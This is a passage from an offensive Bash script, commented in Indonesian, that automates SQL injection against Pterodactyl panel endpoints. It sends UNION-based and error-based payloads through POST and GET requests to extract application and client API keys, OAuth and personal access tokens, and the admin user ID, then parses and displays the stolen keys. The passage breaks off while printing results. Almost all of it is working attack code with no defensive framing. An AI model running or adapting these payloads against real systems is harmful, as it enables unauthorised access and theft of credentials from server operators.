# Function untuk SQL injection
sql_inject() {
    local payload="$1"
    
    # Encode payload
    encoded=$(echo "$payload" | sed 's/ /%20/g' | sed 's/"/%22/g' | sed "s/'/%27/g" | sed 's/;/%3B/g' | sed 's/--/%2D%2D/g' | sed 's/#/%23/g')
    
    # Endpoint yang mungkin vulnerable
    endpoints=(
        "$TARGET_URL/api/application/users"
        "$TARGET_URL/api/client"
        "$TARGET_URL/auth/login"
        "$TARGET_URL/admin/users"
        "$TARGET_URL/api/application/servers"
        "$TARGET_URL/api/client/account"
        "$TARGET_URL/api/application/nodes"
    )
    
    for endpoint in "${endpoints[@]}"; do
        # Coba POST dengan payload di parameter email
        response=$(curl -s -k -X POST "$endpoint" \
            -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Accept: application/json" \
            -d "email=test'$encoded&password=test" \
            --max-time 5 2>/dev/null)
        
        if [ -n "$response" ] && [[ "$response" != *"error"* ]]; then
            echo "$response"
            return 0
        fi
        
        # Coba GET dengan parameter filter
        response=$(curl -s -k -G "$endpoint" \
            -H "User-Agent: Mozilla/5.0" \
            -H "Accept: application/json" \
            --data-urlencode "filter[email]=test' $payload" \
            --max-time 5 2>/dev/null)
        
        if [ -n "$response" ] && [[ "$response" != *"error"* ]]; then
            echo "$response"
            return 0
        fi
    done
    
    echo ""
}

# Payloads untuk mendapatkan API keys
echo -e "${YELLOW}[•] Injecting payloads to extract API keys...${NC}\n"

# 1. Cek tabel api_keys (format Pterodactyl)
PAYLOADS=(
    # Union-based untuk extract multiple columns
    " UNION SELECT 1,CONCAT(id,':',token_type,':',identifier,':',token),3,4,5,6,7,8,9,10 FROM api_keys-- -"
    " UNION SELECT 1,CONCAT(user_id,':',identifier,'-',token),3,4,5,6,7,8,9,10 FROM api_keys-- -"
    " UNION SELECT 1,CONCAT(identifier,'.',token),3,4,5,6,7,8,9,10 FROM api_keys WHERE token_type='application'-- -"
    
    # Cari yang formatnya ptla_ / ptlc_
    " UNION SELECT 1,identifier,3,4,5,6,7,8,9,10 FROM api_keys WHERE identifier LIKE 'ptla_%'-- -"
    " UNION SELECT 1,CONCAT(identifier,token),3,4,5,6,7,8,9,10 FROM api_keys WHERE identifier LIKE 'ptla_%'-- -"
    " UNION SELECT 1,CONCAT(identifier,'-',token),3,4,5,6,7,8,9,10 FROM api_keys WHERE token_type='application'-- -"
    
    # Untuk admin keys
    " UNION SELECT 1,identifier,3,4,5,6,7,8,9,10 FROM api_keys WHERE user_id=1-- -"
    " UNION SELECT 1,CONCAT(identifier,'|',token),3,4,5,6,7,8,9,10 FROM api_keys WHERE user_id=1-- -"
    
    # Coba dari tabel lain
    " UNION SELECT 1,token,3,4,5,6,7,8,9,10 FROM personal_access_tokens-- -"
    " UNION SELECT 1,CONCAT(name,':',token),3,4,5,6,7,8,9,10 FROM oauth_access_tokens-- -"
    
    # Error-based untuk extract
    " AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(identifier) FROM api_keys)))-- -"
    " AND updatexml(1,concat(0x7e,(SELECT token FROM api_keys LIMIT 1)),1)-- -"
)

# Koleksi hasil
declare -A API_KEYS
API_KEYS["ptla"]=""
API_KEYS["ptlc"]=""
API_KEYS["admin_id"]=""
API_KEYS["other"]=()

counter=1
for payload in "${PAYLOADS[@]}"; do
    echo -ne "\r${CYAN}[•] Trying payload $counter/${#PAYLOADS[@]}${NC}"
    
    result=$(sql_inject "$payload")
    
    # Parse hasil untuk mencari API keys
    if [ -n "$result" ]; then
        # Cari pola ptla_ (Pterodactyl Application Key)
        ptla_keys=$(echo "$result" | grep -o 'ptla_[a-zA-Z0-9]\+' || echo "")
        if [ -n "$ptla_keys" ] && [ -z "${API_KEYS[ptla]}" ]; then
            API_KEYS["ptla"]="$ptla_keys"
            echo -e "\n${GREEN}✅ Found PLTA Key: $ptla_keys${NC}"
        fi
        
        # Cari pola ptlc_ (Pterodactyl Client Key)
        ptlc_keys=$(echo "$result" | grep -o 'ptlc_[a-zA-Z0-9]\+' || echo "")
        if [ -n "$ptlc_keys" ] && [ -z "${API_KEYS[ptlc]}" ]; then
            API_KEYS["ptlc"]="$ptlc_keys"
            echo -e "\n${GREEN}✅ Found PTLC Key: $ptlc_keys${NC}"
        fi
        
        # Cari format key lainnya (32-64 karakter hex)
        other_keys=$(echo "$result" | grep -oE '[a-f0-9]{32,64}' | head -3)
        if [ -n "$other_keys" ]; then
            while IFS= read -r key; do
                if [ -n "$key" ]; then
                    API_KEYS["other"]+=("$key")
                    echo -e "\n${YELLOW}📌 Found potential key: $key${NC}"
                fi
            done <<< "$other_keys"
        fi
        
        # Coba dapatkan user_id admin
        admin_id=$(echo "$result" | grep -o '"user_id":[0-9]\+' | grep -oE '[0-9]+' | head -1)
        if [ -n "$admin_id" ] && [ -z "${API_KEYS[admin_id]}" ]; then
            API_KEYS["admin_id"]="$admin_id"
            echo -e "\n${GREEN}✅ Admin User ID: $admin_id${NC}"
        fi
    fi
    
    ((counter++))
done

echo ""

# Jika belum dapat, coba payload khusus untuk extract full key
if [ -z "${API_KEYS[ptla]}" ]; then
    echo -e "\n${YELLOW}[•] Trying advanced payloads for full key extraction...${NC}"
    
    # Payload untuk extract identifier + token secara lengkap
    full_key_payload=" UNION SELECT 1,CONCAT('ID:',user_id,'|TYPE:',token_type,'|KEY:',identifier,token),3,4,5,6,7,8,9,10 FROM api_keys WHERE token_type='application'-- -"
    full_result=$(sql_inject "$full_key_payload")
    
    if [ -n "$full_result" ]; then
        # Parse hasil untuk mendapatkan key lengkap
        if [[ "$full_result" == *"ptla_"* ]]; then
            full_key=$(echo "$full_result" | grep -o 'KEY:ptla_[a-zA-Z0-9]\+' | sed 's/KEY://g')
            if [ -n "$full_key" ]; then
                API_KEYS["ptla"]="$full_key"
                echo -e "${GREEN}✅ Found complete PLTA Key: $full_key${NC}"
            fi
        fi
    fi
fi

# Tampilkan semua hasil
echo -e "\n${GREEN}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║              API KEYS FOUND                               ║${NC}"
echo -e "${GREEN}╠══════════════════════════════════════════════════════════╣${NC}"
echo -e "${GREEN}║                                                           ║${NC}"

if [ -n "${API_KEYS[ptla]}" ]; then
